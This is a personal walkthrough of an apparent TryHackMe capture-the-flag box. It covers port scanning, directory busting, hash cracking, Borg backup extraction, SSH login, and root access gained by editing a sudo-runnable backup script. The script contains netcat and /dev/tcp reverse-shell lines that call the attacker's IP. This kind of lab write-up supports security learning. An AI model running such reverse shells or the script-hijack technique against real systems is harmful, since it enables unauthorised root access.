# Enumeration 
---
Given an ip address of 10.10.22.231, let's perform an `nmap` scan to find open ports.

## Nmap #Nmap 
---
![](IMG-20241124190814257.png)
- looks like we need to slow down our scan 

![](IMG-20241124191226187.png)
- and scanning for all ports is way too slow 
- let's narrow down our port search 

![](IMG-20241124191329223.png)
- ok we didn't get any new info compared to the last scan but in the top 10000 ports it looks like only port 22 and 80 are open.

## Port 80 #http
---
Looks like http is open on port 80 so let's give our target a visit.
![](IMG-20241124191735853.png)
- the default Apache2 page is up

- Let's do a little more `nmap` enumeration to find version numbers
--> `nmap -vv -A -p 80 10.10.22.231` 
![](IMG-20241124192329554.png)
- Apache httpd 2.4.18

![](IMG-20241124192556234.png)
- uhhh looks like we don't need a directory brute forcer because /admin is just open for us. 

Going to the Admins page we see,
![](IMG-20241124193010816.png)
- config files laying about 
- music_archive file 
- there is no scrollbar but scrolling to the left shows just the end of the sentence and nothing more 
- do the hashtags mean anything?


From the main /admin page we can click on Archive which will give us a .tar file download. 
![](IMG-20241124193912828.png)
- .tar file is a file that collects many files into one archive file for distribution or backup purposes 

Upon trying to open the file with mousepad we see this,
![](IMG-20241124194519178.png)
- when catting the file we do not get this info 
- is this id and key important information?

## Port 22 #ssh
---
While we mull over our findings let's try and glean some info from ssh on port 22. 

![](IMG-20241124200542366.png)
- ok ssh is confirmed open 
- once we guess a password we are moving onto the exploitation phase so best not to yet 

--> `nmap -vv -A -p 22 10.10.22.231`
![](IMG-20241124201155594.png)
- we glean the version info 
- and the ssh-hostkey info, is this normal? 

![](IMG-20241124201510546.png)
- looks like this ssh is using RSA which is a type of asymmetric cryptography meaning the public key visibility is totally normal 

![](IMG-20241124202323400.png)
- OpenSSH 7.2 has an exploit on Exploit-DB

# Scrappy enumeration 
---
Now that we have done some basic enumeration, let's follow up on that .tar file we downloaded.

![](IMG-20241126210810908.png)
- `tar -ztvf` is attempting to list the contents of the .tar file
- `tar -xvzf` is attempting to unzip the .tar file 

The problem we are running into is that both .tar and .tar.gz endings seem to not be the right formatting. 

![](IMG-20241127231050334.png)
- viewing the  /admin page source further we seem to find a few hashes 

![](IMG-20241127232048762.png)
- potential code for an ssh exploit 

![](IMG-20241203114015193.png)
- `searchsploit` shows us an exploit for our openSSH version

## SSH Exploitation #Metasploit 
---
The Exploit-DB exploits are in the directory `/usr/share/exploitdb/exploits`. We copy the exploit into our folder of choice. 

![](IMG-20241203123248946.png)
- ok to run this command we specify the user or userlist and then the host 

![](IMG-20241203124211810.png)
- why is there an error in the exploit? 

![](IMG-20241203124501169.png)
- great
- well we can change this easily enough in our script 

![](IMG-20241203125543108.png)
- this OpenSSH timing attack is based on invalid and valid usernames having different response times for authentication 
- the timing for the username Alex indicates that is probably not a user

## Directory busting #gobuster 
---
We've kind of hit a roadblock with SSH and we shouldn't assume that /admin is the only directory on port 80. Let's do a `gobuster` scan and try to tackle the webpage on port 80

![](IMG-20241205234817135.png)
- some interesting directories besides /admin

![](IMG-20241205235715502.png)
- /etc shows us a directory on the server 

![](IMG-20241206000036431.png)
- a file in the /etc directory gives us a password and the term music_archive shows up again  
- using the `hash-identifier` tool we find that the password is a possible MD5(APR) hash. 

![](IMG-20241206002559098.png)
- the other file on the webserver

We can possibly use #hashcat to crack the hash, we have a lot of other information that we have gathered as well like the sha384 and 512 hashes in the source code but I'm not sure how to use it. 

Doing some research on md5(APR) it looks to be an md5 hash specifically for Apache web servers,

![](IMG-20241207000903986.png)
- the password we found on our webserver fits this format

Entering `hashcat -h | grep apr` we see,

![](IMG-20241207002540907.png)
- 1600 is the mode so we need to run (`-m 1600`) to let the program know we are attacking this specific hash 

Running, `hashcat -m 1600 justthepasswd.txt /usr/share/wordlists/rockyou.txt` we are told, _"* Device #1: Not enough allocatable device memory for this attack."_ which is unfortunate. Even the `-O` flag which should optimize this process does not help us.

Doubling our VM's allocated memory and running the same command we crack the hash in about 10 seconds, 

![](IMG-20241209190910399.png)
- hash cracked 

## Borg Backup #borg
---
Somewhere somehow we managed to extract the `archive.tar` file,

![](IMG-20241209193704418.png)
- the contents of `archive.tar` 
- what is a Borg Backup repo?

Visiting the documentation page we are told that Borg is a backup program with the purpose of compressing or encrypting files. We will need to install the `borgbackup` package to use it in the command line.

After some trouble with the install (needed to update the `apt-get` command) we acquire `borg`,

![](IMG-20241209195724480.png)
- the command seems to be working as intended 

Going back to the borg documentation it seems the option we need is _borg info_,

![](IMG-20241209203321276.png)
- we need to run the command `borg info .` (. specifies the folder we are in)

![](IMG-20241209203502187.png)
- and we are prompted with a password
- let's try the only password we know which is `squidward`

![](IMG-20241209203826636.png)
- interesting, not sure this is what I wanted
- maybe we run a different `borg` command? 

What about borg extract? I thought the files were already extracted from the archive but then why would would the "extracted" files lead us to the borg documentation? 

![](IMG-20241209205508265.png)
- after finally getting the syntax correct we are prompted with the password again

![](IMG-20241209205927057.png)
- this wasn't here before...

![](IMG-20241209210021908.png)
- a secret file? 
- is this what we've been searching for? 

![](IMG-20241209210622889.png)
- nope 
- we still have a lot of folders to look in though

![](IMG-20241209211904704.png)
- the four-billionth password we have seen 
- there is nothing else in any of the other folders
- the only place i can think of to use this password is OpenSSH

## OpenSSH login #ssh 
---
Let's attempt to login with the credentials we found,

![](IMG-20241209212756489.png)
- the username is valid....

![](IMG-20241209212925875.png)
- lets go! 
- no need for any fancy ssh exploitation we're in 

![](IMG-20241209213133057.png)
- we got the user flag!

# Privilege Escalation #privesc
---
We have user access to ssh so let's poke around our new domain and try and find some clues. Let's start with the ssh config file? 

![](IMG-20241210210907439.png)
- two config files and a lot of key files 
- what is the difference between `ssh_config` and `sshd_config` ?

![](IMG-20241210211356920.png)
- hmmm I think the server config is what we should focus on

![](IMG-20241210211949376.png)
- we tried :/ 

Reading up on ssh privilege escalation we learn that there is two ways to exploit SSH keys,
1) Reading private keys 
2) Writing to public keys 

The 1st option allows you to authenticate to the server as the root user and the 2nd option allows you to create your own key, bypassing the security check. 

![](IMG-20241210214137114.png)
- we do not have privileges for reading private keys or writing to public keys 

Upon finishing my final exams for the semester I realize we should do enumeration for the privilege escalation phase as well. 

![](IMG-20241222220735748.png)
- #commands

Starting of with the `id` command, 

![](IMG-20241222224144893.png)
- the groups we belong to is interesting specifically `adm` but I'm not sure what do do with this information 

The `sudo-l` command catches my eye,

![](IMG-20241222225444961.png)
- we seem to have access to a script 

```bash
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd

```
- my initial thoughts are that this is simply for the creation of the tar archive that we already decrypted 

However the part that matters to us is not the content but the fact that this script can be run as the root user and we have access to it. This will hopefully allow us to create a reverse shell.

Unfortunately we are not allowed to write to the script but since we should be the owners of the script lets try giving ourselves the permissions with `chmod +w etc/mp3backups/backup.sh`,

![](IMG-20241222233750594.png)
- we gave ourselves the access let's try setting up the reverse shell now 

Ok script changing editing works! Let's setup a shell now,

```bash
#!/bin/bash

nc 10.0.0.81 5555 -e /bin/bash
```
- we set up the listener on our attacker machine with `nc -lvnp 5555` and the shell on the target machine with the script

Running the script with `./backup.sh` we meet this error, 

```
nc: invalid option -- 'e'
This is nc from the netcat-openbsd package. An alternative nc is available
in the netcat-traditional package.
usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
         [-P proxy_username] [-p source_port] [-q seconds] [-s source]
         [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
         [-x proxy_address[:port]] [destination] [port]
```
- apparently ubuntu which is the host machine operating system has 2 packages, netcat and ncat which make using the `-e` flag complicated

Let's pick up a basic bash shell from _revshells.com_ then,

```bash
#!/bin/bash

sh -i >& /dev/tcp/10.9.0.81/5555 0>&1
```
- the updated script 

We have a connection! 

![](IMG-20241223002754179.png)
- nevermind we are still the same user 

The problem we are having is that the alex user is the one executing the script which means the reverse shell will be with his privileges. For root access we need root to run the script. 

The only way I can think of to find a script running by root is through a cronjob. Let's examine the scheduled cronjobs then, 

![](IMG-20241223010107643.png)
- the available cronjobs will not allow us to edit them 

![](IMG-20241223010419167.png)
- even the daily cronjobs will not give us write access 

Wait hold up, the whole purpose of enumerating with `sudo -l` was to find files we can execute as root but when executing the `backup.sh` file we never used sudo! Let's use that bash reverse shell, set up our listener and run `sudo ./backup.sh` this time.

![](IMG-20241223012710106.png)
- Voila! we are root 

Let's capture our flag,

![](IMG-20241223013201362.png)
- EZ 



[TryHackMe Pyrat](TryHackMe%20Pyrat.md)

 